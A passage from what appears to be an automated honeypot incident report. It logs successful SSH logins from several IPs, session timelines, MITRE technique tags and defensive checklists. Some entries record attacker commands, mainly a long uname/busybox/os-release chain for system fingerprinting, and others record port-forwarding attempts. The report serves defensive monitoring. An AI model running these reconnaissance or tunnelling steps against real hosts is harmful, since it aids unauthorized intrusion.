| `2026-07-24 05:02:23` | `cowrie.session.params` |
| `2026-07-24 05:02:23` | `cowrie.command.input` |
| `2026-07-24 05:02:23` | `cowrie.log.closed` |
| `2026-07-24 05:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df02b8919470

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:04 |
| **Last Seen** | 2026-07-24 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:04:09` | `cowrie.session.connect` |
| `2026-07-24 05:04:09` | `cowrie.client.version` |
| `2026-07-24 05:04:09` | `cowrie.client.kex` |
| `2026-07-24 05:04:09` | `cowrie.login.success` |
| `2026-07-24 05:04:10` | `cowrie.session.params` |
| `2026-07-24 05:04:10` | `cowrie.command.input` |
| `2026-07-24 05:04:10` | `cowrie.log.closed` |
| `2026-07-24 05:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe30b4ddb9e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:04 |
| **Last Seen** | 2026-07-24 05:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:04:30` | `cowrie.session.connect` |
| `2026-07-24 05:04:31` | `cowrie.client.version` |
| `2026-07-24 05:04:31` | `cowrie.client.kex` |
| `2026-07-24 05:04:35` | `cowrie.login.success` |
| `2026-07-24 05:04:38` | `cowrie.session.params` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.success` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:38` | `cowrie.command.input` |
| `2026-07-24 05:04:39` | `cowrie.log.closed` |
| `2026-07-24 05:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-240212e76c85

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:05 |
| **Last Seen** | 2026-07-24 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:05:56` | `cowrie.session.connect` |
| `2026-07-24 05:05:56` | `cowrie.client.version` |
| `2026-07-24 05:05:56` | `cowrie.client.kex` |
| `2026-07-24 05:05:57` | `cowrie.login.success` |
| `2026-07-24 05:05:57` | `cowrie.session.params` |
| `2026-07-24 05:05:57` | `cowrie.command.input` |
| `2026-07-24 05:05:57` | `cowrie.log.closed` |
| `2026-07-24 05:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e78912068de8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:06 |
| **Last Seen** | 2026-07-24 05:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:06:47` | `cowrie.session.connect` |
| `2026-07-24 05:06:48` | `cowrie.client.version` |
| `2026-07-24 05:06:48` | `cowrie.client.kex` |
| `2026-07-24 05:06:52` | `cowrie.login.success` |
| `2026-07-24 05:06:54` | `cowrie.session.params` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.success` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:54` | `cowrie.command.input` |
| `2026-07-24 05:06:55` | `cowrie.log.closed` |
| `2026-07-24 05:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2d482fd82b

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-07-24 05:07 |
| **Last Seen** | 2026-07-24 05:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:07:13` | `cowrie.session.connect` |
| `2026-07-24 05:07:14` | `cowrie.client.version` |
| `2026-07-24 05:07:14` | `cowrie.client.kex` |
| `2026-07-24 05:07:16` | `cowrie.login.success` |
| `2026-07-24 05:07:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa22c9dcd6f5

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-07-24 05:07 |
| **Last Seen** | 2026-07-24 05:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:07:27` | `cowrie.session.connect` |
| `2026-07-24 05:07:28` | `cowrie.client.version` |
| `2026-07-24 05:07:28` | `cowrie.client.kex` |
| `2026-07-24 05:07:30` | `cowrie.login.success` |
| `2026-07-24 05:07:31` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-485293de2f2a

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-07-24 05:07 |
| **Last Seen** | 2026-07-24 05:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:07:36` | `cowrie.session.connect` |
| `2026-07-24 05:07:37` | `cowrie.client.version` |
| `2026-07-24 05:07:37` | `cowrie.client.kex` |
| `2026-07-24 05:07:42` | `cowrie.login.success` |
| `2026-07-24 05:07:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a10e108db2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:07 |
| **Last Seen** | 2026-07-24 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:07:38` | `cowrie.session.connect` |
| `2026-07-24 05:07:38` | `cowrie.client.version` |
| `2026-07-24 05:07:38` | `cowrie.client.kex` |
| `2026-07-24 05:07:39` | `cowrie.login.success` |
| `2026-07-24 05:07:39` | `cowrie.session.params` |
| `2026-07-24 05:07:39` | `cowrie.command.input` |
| `2026-07-24 05:07:39` | `cowrie.log.closed` |
| `2026-07-24 05:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40772f4c3b74

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:08 |
| **Last Seen** | 2026-07-24 05:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:08:58` | `cowrie.session.connect` |
| `2026-07-24 05:08:59` | `cowrie.client.version` |
| `2026-07-24 05:08:59` | `cowrie.client.kex` |
| `2026-07-24 05:09:03` | `cowrie.login.success` |
| `2026-07-24 05:09:05` | `cowrie.session.params` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.success` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:05` | `cowrie.command.input` |
| `2026-07-24 05:09:06` | `cowrie.log.closed` |
| `2026-07-24 05:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f485ef0dac6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:09 |
| **Last Seen** | 2026-07-24 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:09:18` | `cowrie.session.connect` |
| `2026-07-24 05:09:18` | `cowrie.client.version` |
| `2026-07-24 05:09:18` | `cowrie.client.kex` |
| `2026-07-24 05:09:18` | `cowrie.login.success` |
| `2026-07-24 05:09:19` | `cowrie.session.params` |
| `2026-07-24 05:09:19` | `cowrie.command.input` |
| `2026-07-24 05:09:19` | `cowrie.log.closed` |
| `2026-07-24 05:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee6b9290914

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-07-24 05:10 |
| **Last Seen** | 2026-07-24 05:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:10:39` | `cowrie.session.connect` |
| `2026-07-24 05:10:39` | `cowrie.client.version` |
| `2026-07-24 05:10:39` | `cowrie.client.kex` |
| `2026-07-24 05:10:40` | `cowrie.login.success` |
| `2026-07-24 05:10:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c595cd15a7

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-07-24 05:10 |
| **Last Seen** | 2026-07-24 05:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:10:46` | `cowrie.session.connect` |
| `2026-07-24 05:10:47` | `cowrie.client.version` |
| `2026-07-24 05:10:47` | `cowrie.client.kex` |
| `2026-07-24 05:10:50` | `cowrie.login.success` |
| `2026-07-24 05:10:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-971625f2a6d8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:11 |
| **Last Seen** | 2026-07-24 05:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:11:02` | `cowrie.session.connect` |
| `2026-07-24 05:11:02` | `cowrie.client.version` |
| `2026-07-24 05:11:02` | `cowrie.client.kex` |
| `2026-07-24 05:11:02` | `cowrie.login.success` |
| `2026-07-24 05:11:03` | `cowrie.session.params` |
| `2026-07-24 05:11:03` | `cowrie.command.input` |
| `2026-07-24 05:11:03` | `cowrie.log.closed` |
| `2026-07-24 05:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27718ccd7681

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:11 |
| **Last Seen** | 2026-07-24 05:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:11:08` | `cowrie.session.connect` |
| `2026-07-24 05:11:09` | `cowrie.client.version` |
| `2026-07-24 05:11:09` | `cowrie.client.kex` |
| `2026-07-24 05:11:12` | `cowrie.login.success` |
| `2026-07-24 05:11:14` | `cowrie.session.params` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.success` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.command.input` |
| `2026-07-24 05:11:14` | `cowrie.log.closed` |
| `2026-07-24 05:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85cec617bab7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:12 |
| **Last Seen** | 2026-07-24 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:12:49` | `cowrie.session.connect` |
| `2026-07-24 05:12:49` | `cowrie.client.version` |
| `2026-07-24 05:12:49` | `cowrie.client.kex` |
| `2026-07-24 05:12:49` | `cowrie.login.success` |
| `2026-07-24 05:12:50` | `cowrie.session.params` |
| `2026-07-24 05:12:50` | `cowrie.command.input` |
| `2026-07-24 05:12:50` | `cowrie.log.closed` |
| `2026-07-24 05:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5001d42e6db

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:13 |
| **Last Seen** | 2026-07-24 05:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:13:26` | `cowrie.session.connect` |
| `2026-07-24 05:13:26` | `cowrie.client.version` |
| `2026-07-24 05:13:26` | `cowrie.client.kex` |
| `2026-07-24 05:13:29` | `cowrie.login.success` |
| `2026-07-24 05:13:31` | `cowrie.session.params` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.success` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:31` | `cowrie.command.input` |
| `2026-07-24 05:13:32` | `cowrie.log.closed` |
| `2026-07-24 05:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a96f3594d36e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:14 |
| **Last Seen** | 2026-07-24 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:14:33` | `cowrie.session.connect` |
| `2026-07-24 05:14:33` | `cowrie.client.version` |
| `2026-07-24 05:14:33` | `cowrie.client.kex` |
| `2026-07-24 05:14:33` | `cowrie.login.success` |
| `2026-07-24 05:14:34` | `cowrie.session.params` |
| `2026-07-24 05:14:34` | `cowrie.command.input` |
| `2026-07-24 05:14:34` | `cowrie.log.closed` |
| `2026-07-24 05:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dee9318d011

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:15 |
| **Last Seen** | 2026-07-24 05:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:15:44` | `cowrie.session.connect` |
| `2026-07-24 05:15:45` | `cowrie.client.version` |
| `2026-07-24 05:15:45` | `cowrie.client.kex` |
| `2026-07-24 05:15:47` | `cowrie.login.success` |
| `2026-07-24 05:15:49` | `cowrie.session.params` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.success` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:49` | `cowrie.command.input` |
| `2026-07-24 05:15:50` | `cowrie.log.closed` |
| `2026-07-24 05:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3da98f58175b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:16 |
| **Last Seen** | 2026-07-24 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:16:19` | `cowrie.session.connect` |
